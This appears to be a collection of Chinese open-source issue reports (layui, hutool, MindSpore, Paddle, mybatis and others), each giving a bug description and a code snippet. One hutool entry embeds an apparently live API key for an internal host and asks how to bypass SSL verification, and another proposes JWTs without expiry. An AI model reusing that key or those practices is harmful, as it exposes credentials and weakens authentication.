PageHelper新版本分页,新版本分页仍然是在原有基础上添加（如果不容易整合就独立）。 新版分页特定是通过参数配置（方法优先于方法）来控制在上拦截支持二级缓存。 或者是在上拦截（实现简单）但是不支持二级缓存。 mybatis二级缓存隐藏的危险大于他带来的好处，因此不支持二级缓存不是一个问题。 正确处理缓存的方式是在业务层进行处理！   <code>: setProperties plugin Executor StatementHandler
数据库建表语句存在过多索引问题,"版本号： v3.1.0 sys_user 表对 username 字段同时建立唯一索引和普通索引，idx_su_username应该没有用，应该可以删除，其实表也有相关问题如sys_depart等   <code>: PRIMARY KEY (`id`) USING BTREE, UNIQUE KEY `uniq_sys_user_work_no` (`work_no`) USING BTREE, UNIQUE KEY `uniq_sys_user_username` (`username`) USING BTREE, UNIQUE KEY `uniq_sys_user_phone` (`phone`) USING BTREE, UNIQUE KEY `uniq_sys_user_email` (`email`) USING BTREE, KEY `idx_su_username` (`username`) USING BTREE, KEY `idx_su_status` (`status`) USING BTREE, KEY `idx_su_del_flag` (`del_flag`) USING BTREE ) ENGINE=InnoDB DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='用户表';"
table-2.8.0，数据行合并列通过table.init方法渲染后错位问题,"版本：2.8.0 描述：上图问看题   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta name=""renderer"" content=""webkit|ie-comp|ie-stand""&gt; &lt;meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" /&gt; &lt;title&gt;layui.table&lt;/title&gt; &lt;link rel=""stylesheet"" type=""text/css"" href=""/layui-2.8.0/css/layui.css""&gt; &lt;script type=""text/javascript"" src=""/layui-2.8.0/layui.js""&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;渲染效果：&lt;/h1&gt; &lt;table class=""layui-table"" lay-filter=""test"" id=""test"" style=""text-align: center; width: 400px;""&gt; &lt;thead&gt; &lt;tr&gt; &lt;th lay-data=""{field:'a1',align:'center',width:100}"" rowspan=""2""&gt;地区&lt;/th&gt; &lt;th lay-data=""{field:'a2',align:'center',width:100}"" rowspan=""2""&gt;城市&lt;/th&gt; &lt;th lay-data=""{align:'center',width:200}"" colspan=""2""&gt;数据&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th lay-data=""{field:'a8',align:'center',width:100}""&gt;数据1&lt;/th&gt; &lt;th lay-data=""{field:'a9',align:'center',width:100}""&gt;数据2&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td rowspan=""3""&gt;河南&lt;/td&gt; &lt;td&gt;郑州&lt;/td&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;洛阳&lt;/td&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;4&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;开封&lt;/td&gt; &lt;td&gt;5&lt;/td&gt; &lt;td&gt;6&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=""3""&gt;辽宁&lt;/td&gt; &lt;td&gt;沈阳&lt;/td&gt; &lt;td&gt;7&lt;/td&gt; &lt;td&gt;8&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;大连&lt;/td&gt; &lt;td&gt;9&lt;/td&gt; &lt;td&gt;10&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;鞍山&lt;/td&gt; &lt;td&gt;11&lt;/td&gt; &lt;td&gt;12&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;hr&gt; &lt;h1&gt;实际效果：&lt;/h1&gt; &lt;table width=""400"" border=""1"" cellspacing=""0"" style=""text-align:center""&gt; &lt;tr&gt; &lt;td rowspan=""2""&gt;城市&lt;/td&gt; &lt;td rowspan=""2""&gt;地区&lt;/td&gt; &lt;td colspan=""2""&gt;数据&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;数据1&lt;/td&gt; &lt;td&gt;数据2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=""3""&gt;河南&lt;/td&gt; &lt;td&gt;郑州&lt;/td&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt;2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;洛阳&lt;/td&gt; &lt;td&gt;3&lt;/td&gt; &lt;td&gt;4&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;开封&lt;/td&gt; &lt;td&gt;5&lt;/td&gt; &lt;td&gt;6&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=""3""&gt;辽宁&lt;/td&gt; &lt;td&gt;沈阳&lt;/td&gt; &lt;td&gt;7&lt;/td&gt; &lt;td&gt;8&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;大连&lt;/td&gt; &lt;td&gt;9&lt;/td&gt; &lt;td&gt;10&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;鞍山&lt;/td&gt; &lt;td&gt;11&lt;/td&gt; &lt;td&gt;12&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;script&gt; var table = layui.table; table.init('test',{width:'500px'}); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
TOKEN刷新及管理方式,"版本号：2.1.1 JWT生成的token，不一定要设置过期时间，不使用withExpiresAt 方法，只是让token携带一定的user的信息，token过期时间让redis来管理就可以了，当前请求访问完成刷新token在redis中缓存的时间即可 详细可看下 https://gitee.com/zjm16/zjmzxfzhl ，这个架构很多也是参考jeecg-boot内容开发架构的 问题截图：无   <code>: public static String sign(String userId, String secret, Date date) { Algorithm algorithm = Algorithm.HMAC256(secret); if (date != null) { // 如果有传过期时间，则加入过期时间 return JWT.create().withClaim(""userId"", userId).withExpiresAt(date).sign(algorithm); } else {// 不设置过期时间，可以使用redis等缓存来管理过期时间 return JWT.create().withClaim(""userId"", userId).withClaim(""date"", DateUtil.getNow()).sign(algorithm); } } public boolean verifyTokenWithRedis(String token, String userId, String password) { String userTokenKey = Constants.PREFIX_USER_TOKEN + userId; // 校验token有效性，若验证通过，刷新token缓存时间 if (token.equals(redisUtil.get(userTokenKey)) &amp;&amp; JwtUtil.verify(token, userId, password)) { redisUtil.expire(userTokenKey, JwtUtil.EXPIRE_TIME); redisUtil.expire(Constants.PREFIX_USER_SESSION_OBJECT + userId, JwtUtil.EXPIRE_TIME); return true; } return false; }"
Rename `AsNoGradient` of VariableBuilder to `NotInGradient`,fix #3539:Feature/extract op info into op info.cc change to   <code>: AsNoGradient() NotInGradient()
FIX: propagation dependencies and rebuild out of date libs,"Pain points: When I implemented buddy allocator, finally I want to merge all small pieces libraries to for testing memory recycling effects. I found the original generic implementation doesn't allow propagation dependencies and also cannot track out of date records. The new features for merging static libraries. propagation dependencies rebuild the out of date static library   <code>: paddle_memory if(${WITH_GPU}) nv_library(system_allocator SRCS system_allocator.cc DEPS gflags cpu_info gpu_info) else(${WITH_GPU}) cc_library(system_allocator SRCS system_allocator.cc DEPS gflags cpu_info) endif(${WITH_GPU}) cc_test(system_allocator_test SRCS system_allocator_test.cc DEPS system_allocator) cc_library(meta_data SRCS meta_data.cc) cc_library(meta_cache SRCS meta_cache.cc) cc_library(memory_block SRCS memory_block.cc) cc_library(buddy_allocator SRCS buddy_allocator.cc DEPS glog) cc_library(memory SRCS memory.cc) cc_library(paddle_memory DEPS memory meta_data meta_cache memory_block buddy_allocator system_allocator) cc_test(memory_test SRCS memory_test.cc DEPS place paddle_memory)"
使用layui treetable组件时，定时刷新时会将子节点变换成父节点,"版本：2.8.0-beta.3 描述：使用layui treetable组件时，定时刷新时会将子节点变换成父节点 layui.use(['table', 'form', 'jquery', 'treetable'], function() { let table = layui.table; let form = layui.form; let $ = layui.jquery; let treetable = layui.treetable;   <code>: var t1 = window.setInterval(cz, 5000); let MODULE_PATH = ""operate/""; function cz() { layui.use(['table'], function() { table.reloadData('power-table', { url: javaapiUrl + ""/detectorData/redisbenanDetectorDatasTable"", //数据接口 scrollPos: 'fixed', }); }) } window.render = function() { // let data; treetable.render({ treeColIndex: 1, treeSpid: 0, treeIdName: 'powerId', treePidName: 'parentId', skin: 'line', treeDefaultClose: true, elem: '#power-table', // data: data, url: javaapiUrl + ""/detectorData/redisbenanDetectorDatasTable"", page: false, parseData: function(res) { let objk = { ""code"": 0, //解析接口状态 ""msg"": res.message, //解析提示文本 ""count"": res.result.length, //解析数据长度 ""data"": res.result, //解析数据列表 }; console.log('数据转换', res); return objk }, cols: [ [{ type: 'checkbox' }, { field: 'shopname', minWidth: 200, title: '车间名' }, { field: 'controlname', title: '传感器名', }, { field: 'gastype', title: '气体类型', }, { field: 'detectorconcentration', title: '实时数据', }, { field: 'unit', title: '气体单位', }, { field: 'now', title: '检测时间', }, ] ], done: function(d) { console.log('done', d); } }); }"
ZipUtil解压时不支持压缩包中带有中文的文件。,"我指定编码或者默认都不可以! 堆栈为： version 4.0.4   <code>: File unzip = ZipUtil.unzip(""E:\\测试.zip"", CharsetUtil.GBK); java.lang.IllegalArgumentException: MALFORMED at java.util.zip.ZipCoder.toString(ZipCoder.java:58) at java.util.zip.ZipFile.getZipEntry(ZipFile.java:583) at java.util.zip.ZipFile.access$900(ZipFile.java:60) at java.util.zip.ZipFile$ZipEntryIterator.next(ZipFile.java:539) at java.util.zip.ZipFile$ZipEntryIterator.nextElement(ZipFile.java:514) at java.util.zip.ZipFile$ZipEntryIterator.nextElement(ZipFile.java:495) at cn.hutool.core.util.ZipUtil.unzip(ZipUtil.java:387) at cn.hutool.core.util.ZipUtil.unzip(ZipUtil.java:351) at cn.hutool.core.util.ZipUtil.unzip(ZipUtil.java:338)"
在GPU静态图模式下，如何得到终止索引可变的切片？,"这个NMS_with_angle的Cell在GPU静态图模式下运行，会报如下错误： TypeError: mindspore/ccsrc/runtime/device/gpu/kernel_info_setter.cc:412 PrintUnsupportedTypeException] Select GPU kernel op[StridedSlice] fail! Incompatible data type! The supported data types are input[Float64], output[Float64]; input[Float32], output[Float32]; input[Float16], output[Float16]; input[Int64], output[Int64]; input[Int32], output[Int32]; input[Int16], output[Int16]; input[Int8], output[Int8]; input[UInt64], output[UInt64]; input[UInt32], output[UInt32]; input[UInt16], output[UInt16]; input[UInt8], output[UInt8]; input[Bool], output[Bool]; , but get input[Int64 Int64 Int64 Int64 ] output[Int64 ] 由op返回的num的值是可变的，因此切片无法使用常量去完成。idx和num的shape均在注释中写出。请问，能帮忙分析一下报错原因或者有什么方法能完成切片吗？   <code>: class NMS_with_angle(Cell): def __init__(self, IOU_threshold=0.5): super(NMS_with_angle, self).__init__() self.IOU_threshold = Tensor(IOU_threshold, dtype=mstype.float32) self.sort = ops.Sort(axis=0, descending=True) self.slice = ops.Slice() self.gather = ops.Gather() def construct(self, bbox, score): """""" params: bbox: (N, 5) [x1, y1, x2, y2, ry] score: (N,) return: indices: (M,) whose iou_value is lower than threshold """""" N, _ = bbox.shape _, score_sorted = self.sort(score) # (N,) bbox = bbox[score_sorted] op = ops.Custom(""./NMSWithAngle.so:NMS_WITH_ANGLE"", out_shape=((N,),(1,)), out_dtype=(mstype.int64, mstype.int64), func_type=""aot"") idx, num = op(self.IOU_threshold ,bbox) # (N,), int64. (1,), int64. return score_sorted[idx[:num[0]]]"
Compiling failure in Custom Op,"Compiling failure in Custom Op / 硬件环境: /device gpu : -- MindSpore version : r1.6 -- Python version : Python 3.7.5 -- OS platform and distribution : Linux -- GCC/Compiler version : N/A (/): /mode graph Run the above codes Compiling succeeds. TVMError: Check failed: !var_idmap_.count(v): Need input to be in SSA form dup input_0   <code>: import numpy as np from mindspore import context, Tensor, ms_function import mindspore.ops as ops from mindspore.ops.operations._ms_hybrid import ms_hybrid context.set_context(device_target=""GPU"") @ms_hybrid def add(a, b): c = output_tensor((2, 2), ""float32"") for i0 in range(a.shape[0]): for i1 in range(a.shape[1]): c[i0, i1] = a[i0, i1] + b[i0, i1] return c op = ops.Custom(add) @ms_function def ms_net(x): return op(x, x) if __name__ == ""__main__"": op = ops.Custom(add) x0 = np.array([[0.0, 0.0], [1.0, 1.0]]).astype(np.float32) output = ms_net(Tensor(x0)) print(output)"
自己想实现batchUpdate 但是报错了，请各位帮忙看看,"这个是我的测试代码(运行batchupdate) 报错信息如下: 目前我在工作中经常用户批量修改功能,也就是根据id修改某个字段或者多个字段 我参照你的InsertListMapper 写了一个BatchUpdateMapper,运行不成功,代码如下 最后请大神,在百忙之中,帮我解决这个问题 谢谢   <code>: SqlSession sqlSession = MybatisHelper.getSqlSession(); try { CountryMapper mapper = sqlSession.getMapper(CountryMapper.class); List&lt;Country&gt; countryList = mapper.selectAll(); //查询总数 countryList.forEach(country -&gt; country.setCountryname(""修改了"")); countryList = countryList.subList(0, 3); mapper.batchUpdate(countryList); mapper.insertList(countryList); List&lt;Country&gt; countries = mapper.selectAll(); Assert.assertEquals(183, countryList.size()); } finally { sqlSession.close(); } org.apache.ibatis.exceptions.PersistenceException: ### Error updating database. Cause: java.sql.SQLSyntaxErrorException: unexpected token: UPDATE : line: 6 ### SQL: UPDATE country SET countryname = ?,countrycode = ? WHERE id = ? ; UPDATE country SET countryname = ?,countrycode = ? WHERE id = ? ; UPDATE country SET countryname = ?,countrycode = ? WHERE id = ? ### Cause: java.sql.SQLSyntaxErrorException: unexpected token: UPDATE : line: 6 at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:23) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:150) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:49) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:43) at com.sun.proxy.$Proxy15.batchUpdate(Unknown Source) at tk.mybatis.mapper.test.country.TestSelectAll.testDynamicSelectPage(TestSelectAll.java:57) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:271) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:70) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:50) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229) at org.junit.runners.ParentRunner.run(ParentRunner.java:309) at org.junit.runner.JUnitCore.run(JUnitCore.java:160) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:69) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:234) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:74) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:144) Caused by: java.sql.SQLSyntaxErrorException: unexpected token: UPDATE : line: 6 at org.hsqldb.jdbc.Util.sqlException(Unknown Source) at org.hsqldb.jdbc.Util.sqlException(Unknown Source) at org.hsqldb.jdbc.JDBCPreparedStatement.&lt;init&gt;(Unknown Source) at org.hsqldb.jdbc.JDBCConnection.prepareStatement(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.apache.ibatis.logging.jdbc.ConnectionLogger.invoke(ConnectionLogger.java:50) at com.sun.proxy.$Proxy16.prepareStatement(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.instantiateStatement(PreparedStatementHandler.java:70) at org.apache.ibatis.executor.statement.BaseStatementHandler.prepare(BaseStatementHandler.java:82) at org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare(RoutingStatementHandler.java:54) at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:70) at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:44) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:100) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:75) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:148) ... 30 more Caused by: org.hsqldb.HsqlException: unexpected token: UPDATE : line: 6 at org.hsqldb.error.Error.parseError(Unknown Source) at org.hsqldb.ParserBase.unexpectedToken(Unknown Source) at org.hsqldb.ParserCommand.compileStatement(Unknown Source) at org.hsqldb.Session.compileStatement(Unknown Source) at org.hsqldb.StatementManager.compile(Unknown Source) at org.hsqldb.Session.execute(Unknown Source) ... 46 more package tk.mybatis.mapper.common.special; import org.apache.ibatis.annotations.UpdateProvider; import tk.mybatis.mapper.provider.SpecialProvider; import java.util.List; public interface BatchUpdateMapper&lt;T&gt; { @UpdateProvider(type = SpecialProvider.class, method = ""dynamicSQL"") int batchUpdate(List&lt;T&gt; recordList); } package tk.mybatis.mapper.provider; import org.apache.ibatis.mapping.MappedStatement; import tk.mybatis.mapper.entity.EntityColumn; import tk.mybatis.mapper.mapperhelper.EntityHelper; import tk.mybatis.mapper.mapperhelper.MapperHelper; import tk.mybatis.mapper.mapperhelper.MapperTemplate; import tk.mybatis.mapper.mapperhelper.SqlHelper; import java.util.Set; import java.util.regex.Matcher; import java.util.regex.Pattern; /** * SpecialProvider实现类，特殊方法实现类 * * @author liuzh */ public class SpecialProvider extends MapperTemplate { public SpecialProvider(Class&lt;?&gt; mapperClass, MapperHelper mapperHelper) { super(mapperClass, mapperHelper); } public String batchUpdate(MappedStatement ms) { final Class&lt;?&gt; entityClass = getEntityClass(ms); //开始拼sql StringBuilder sqlSB = new StringBuilder(); sqlSB.append(""&lt;foreach collection=\""list\"" item=\""record\"" open=\""\"" close=\""\"" separator=\"";\"" &gt;""); sqlSB.append(SqlHelper.updateTable(entityClass, tableName(entityClass))); String updateSetColumnsStr = SqlHelper.updateSetColumns(entityClass, null, true, isNotEmpty()); updateSetColumnsStr = replaceUpdateSetStr(updateSetColumnsStr); sqlSB.append(updateSetColumnsStr); sqlSB.append(SqlHelper.wherePKColumns(entityClass)); sqlSB.append(""&lt;/foreach&gt;""); String sql = sqlSB.toString(); sql = sql.replaceAll(""#\\{"", ""#{record.""); return sql; } private String replaceUpdateSetStr(String str) { String regexStr = ""&lt;if test=\""(\\w+) != null and \\1 != '' \""&gt;""; Pattern pattern = Pattern.compile(regexStr); Matcher matcher = pattern.matcher(str); StringBuffer sb = new StringBuffer(); while (matcher.find()) { matcher.appendReplacement(sb, ""&lt;if test=\""record.$1 != null and record.$1 != '' \""&gt;""); } matcher.appendTail(sb); return sb.toString(); }"
HttpRequest如何跳过SSL,"JDK版本： jdk11 hutool版本： 5.8.8 现在的版本如何跳过SSL验证 cn.hutool.core.io.IORuntimeException: SSLHandshakeException: Failed to parse server certificates Caused by: javax.net.ssl.SSLHandshakeException: Failed to parse server certificates Caused by: java.security.cert.CertificateParsingException: Empty issuer DN not allowed in X509Certificates   <code>: public void test(){ String body = HttpRequest.get(""https://10.111.10.58:9443/api/endpoints/2/docker/version"") .header(""X-API-Key"", ""ptr_KGBARfxFJH5TcKr5e2EFZyxs+A3zfxNtRQMzJuNbwEg="") .execute().body(); }"
发现jpress一个特别搞笑的bug,"版本:最新版本 情况说明:一般情况下发生在页面源码编辑添加tab选项卡,比如   <code>: &lt;ul class=""xx""&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;/ul&gt; 保存后硬给自动改成了 &lt;ul &gt; &lt;li class=""xx""&gt;1&lt;/li&gt; &lt;li class=""xx""&gt;2&lt;/li&gt; &lt;/ul&gt; 该功能百发百中"
[CT][MS][pynative]test_pynative_change_requires_grad_in_construct Segmentation fault,Segmentation fault / 硬件环境: /device ascend : -- MindSpore version :master-46392 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative test_pynative_change_requires_grad_in_construct pytest -s pynative/test_pynative_syntax.py::test_pynative_change_requires_grad_in_construct case pass   <code>: ../pynative/test_pynative_syntax.py::test_pynative_return_list_in_construct PASSED [ 67%] ../pynative/test_pynative_syntax.py::test_pynative_return_bool_and_scalar_in_construct PASSED [ 68%] ../pynative/test_pynative_syntax.py::test_pynative_return_nothing_in_construct PASSED [ 70%] ../pynative/test_pynative_syntax.py::test_pynative_change_requires_grad_in_construct Fatal Python error: Segmentation fault
data属性设置json字符串 + @Body参数的情况下报NullPointerException,"在AbstractBodyBuilder 109行 当bodyItem instanceof NameValueRequestBody时，jsonMap有初始化 当bodyItem instanceof StringRequestBody时，jsonMap未初始化，导致NullPointerException   <code>: java.lang.NullPointerException at com.dtflys.forest.backend.body.AbstractBodyBuilder.buildBody(AbstractBodyBuilder.java:109) at com.dtflys.forest.backend.httpclient.executor.AbstractHttpclientExecutor.prepareBody(AbstractHttpclientExecutor.java:128) at com.dtflys.forest.backend.httpclient.executor.AbstractHttpclientExecutor.prepare(AbstractHttpclientExecutor.java:77) at com.dtflys.forest.backend.httpclient.executor.AbstractHttpclientExecutor.execute(AbstractHttpclientExecutor.java:154) at com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:1687) at com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:1704) at com.dtflys.forest.reflection.ForestMethod.invoke(ForestMethod.java:1175) @Post(url = ""https://api.tt.com/predict"", contentType = ""application/json"", data = ""{'username':'123', 'password':'321'}"") JSONObject getCode(@Body(""typeid"") String typeid); if (bodyItem instanceof NameValueRequestBody) { if (jsonMap == null) { jsonMap = new LinkedHashMap&lt;&gt;(bodyList.size()); } jsonMap.put(((NameValueRequestBody) bodyItem).getName(), ((NameValueRequestBody) bodyItem).getValue()); } else if (bodyItem instanceof StringRequestBody) { String content = bodyItem.toString(); Map subMap = null; try { subMap = jsonConverter.convertObjectToMap(content); } catch (Throwable th) {} if (subMap != null) { jsonMap.putAll(subMap); } else { if (jsonArray == null) { jsonArray = new LinkedList&lt;&gt;(); } jsonArray.add(content); } }"
登录页密码输入框点击显示密码,"类似图中所示，点击眼睛图标显示密码明文 使用如下代码样式有问题， css   <code>: &lt;div class=""input-group""&gt; &lt;input class=""form-control pword"" id=""pass"" name=""pass"" placeholder=""密码"" type=""password""/&gt; &lt;span class=""input-group-addon"" title=""登录密码,鼠标按下显示密码"" onmousedown=""$('#pass').attr('type','text')"" onmouseup=""$('#pass').attr('type','password')""&gt;&lt;i class=""fa fa-key""&gt;&lt;/i&gt; &lt;/span&gt; &lt;/div&gt;"
MDI子窗体有3D效果，能否增加一个属性来开关3D效果？,"添加一个属性，然后根据属性来选择是否屏蔽3D效果（无法实时预览，运行后会被自动移除）   <code>: [DllImport(""user32.dll"")] static extern long GetWindowLong(IntPtr hWnd, int nIndex); [DllImport(""user32.dll"")] static extern long SetWindowLong(IntPtr hWnd, int nIndex, long value); private void Form1_Load(object sender, EventArgs e) { foreach (Control c in this.Controls) { if (c is MdiClient) { IntPtr h = c.Handle; SetWindowLong(h, -16, GetWindowLong(h, -16) &amp; ~0x00800000L); SetWindowLong(h, -20, GetWindowLong(h, -20) &amp; ~0x00000200L); break; } } }"
html中自动生成的字段，如不想让显示，不能直接去掉，怎么能隐藏？列表中字典回显，写法也有问题。,"我这样做，显示“正在努力地加载数据中，请稍候……”   <code>: { field: 'clinetsex', title: '客户性别', formatter: function(value, row, index) { return $.table.selectDictLabel(sys_user_sex, value); } }, }; $.table.init(options); $.table.hideColumn(""client""); });"
[MD] Add missing ImageBatchFormat to dataset/vision/__init__.py,"Add missing ImageBatchFormat init py ImageBatchFormat is missing from dataset/vision/init.py Thus results in ImportError: cannot import name 'ImageBatchFormat' from 'mindspore.dataset.vision' ImageBatchFormat needs to be added dataset/vision/init.py so that the import is successful A workaround is the following, to import directly from utils   <code>: from mindspore.dataset.vision.utils import Border, ImageBatchFormat, Inter from mindspore.dataset.vision.utils import Border, ImageBatchFormat, Inter"
dataset: add c++ data augmentation op and try think scheme to support user define,"RFC In common case, op implemented in c++ layer has better performance than python layer. currently, MindData does not support user to define c++ op, thus we want to enable this way. Task Goal 1) way for add some c++ operation op we can analysis the general way that add c++ data augmentation op like in pr: 3 month ago，add invert: !3077:supporting cpp invert operation 12.14 add NormalizePad: !9910:[MD][Perf] MindData add NormalizePad for GPU performance check the current supported c++ op list in website: https://www.mindspore.cn/doc/api_python/zh-CN/r1.0/mindspore/mindspore.dataset.vision.html#module-mindspore.dataset.vision.c_transforms think the common used op, find one or two that are not included in op list; and try implement it, and raise pr. some suggested op you can try are as follows: already implemented in py_transform, but not in c_transform common used, like gaussian process operation, like and some common used function in numpy, like: the lite op is greatly need, these op will be used in lite device like phone, watch ects: 2) way for try thinking out schema that better support user define we can analysis the general way that add c++ data augmentation op like in pr: !3077:supporting cpp invert operation and we can refer some meteraia like: how pytorch do this： https://zhuanlan.zhihu.com/p/158643792 supported way should be convenient, for example: we want to write the key part code like op1.cc op1.h, and op registed in automaticly in other file like with running a script. based on proposed way, and add an simple op to verify above supported way(can find one implemented in py_transform but not in c_transform). Way for Discussion If you have question or problems, please comment in this issue.   <code>: GaussianNoise，GaussianFilter np.rot90, np.clip Canny minMaxLoc exp max sobel countNonZero ..."
时间序列输入lstm问题,"输入为：长360的list，想以6的time_step分60次输入lstm 网络结构：3层lstm 报错：   <code>: data_layer_dict = {} for iter in ['rnn_state_input']: data_stream = paddle.layer.data( name=iter, type=paddle.data_type.dense_vector_sequence(6)) data_layer_dict[iter] = data_stream stacked_num = 3 hid_dim = 64 lstm1 = paddle.layer.lstmemory( input=data_layer_dict['rnn_state_input'], act=paddle.activation.Relu(), bias_attr=False) inputs = lstm1 for i in range(2, stacked_num + 1): lstm = paddle.layer.lstmemory( input=inputs, act=paddle.activation.Relu(), bias_attr=False) inputs = lstm lstm_last = paddle.layer.pooling(input=inputs, pooling_type=paddle.pooling.Max()) I1214 03:18:11.936250 982 Util.cpp:166] commandline: --use_gpu=True --trainer_count=1 Traceback (most recent call last): File ""traffic_predict_rnn.py"", line 388, in &lt;module&gt; train_traffic_rnn_model(num_pass_val, is_local_val, learning_rate, batch_size) File ""traffic_predict_rnn.py"", line 262, in train_traffic_rnn_model cost_output_label_map = traffic_rnn_net() File ""traffic_predict_rnn.py"", line 208, in traffic_rnn_net input=data_layer_dict['rnn_state_input'], act=paddle.activation.Relu(), bias_attr=False) File ""/usr/local/lib/python2.7/dist-packages/paddle/v2/config_base.py"", line 52, in wrapped out = f(*args, **xargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/default_decorators.py"", line 53, in __wrapper__ return func(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/layers.py"", line 415, in wrapper return method(*args, **kwargs) File ""/usr/local/lib/python2.7/dist-packages/paddle/trainer_config_helpers/layers.py"", line 1558, in lstmemory assert input.size is not None and input.size % 4 == 0 AssertionError"
ResizeNearestNeighbor 算子昇腾平台不支持Int32类型,"ResizeNearestNeighbor 算子昇腾平台不支持Int32类型 / 硬件环境: /device ascend等其他芯片 : -- MindSpore version :1.5.0 -- Python version :3.7.5 -- OS platform and distribution :18.04 -- GCC/Compiler version : 7.5.0 (/): /mode pynative /mode graph 在昇腾平台执行以上用例 执行成功   <code>: import pytest import numpy as np import mindspore import os import mindspore.context as context import mindspore.nn as nn from mindspore import Tensor from mindspore.common.api import ms_function from mindspore.ops import operations as P context.set_context(mode=context.PYNATIVE_MODE, device_target=""Ascend"") class Net(nn.Cell): def __init__(self, size): super(Net, self).__init__() self.reverse_sequence = P.ResizeNearestNeighbor(size) @ms_function def construct(self, input): return self.reverse_sequence(input) def test_resize(): net = Net((2, 2)) input_tensor = Tensor(np.array([[[[1, 2, 3], [4, 5, 6]]]]), mindspore.int32) output = net(input_tensor) print(output) test_resize()"
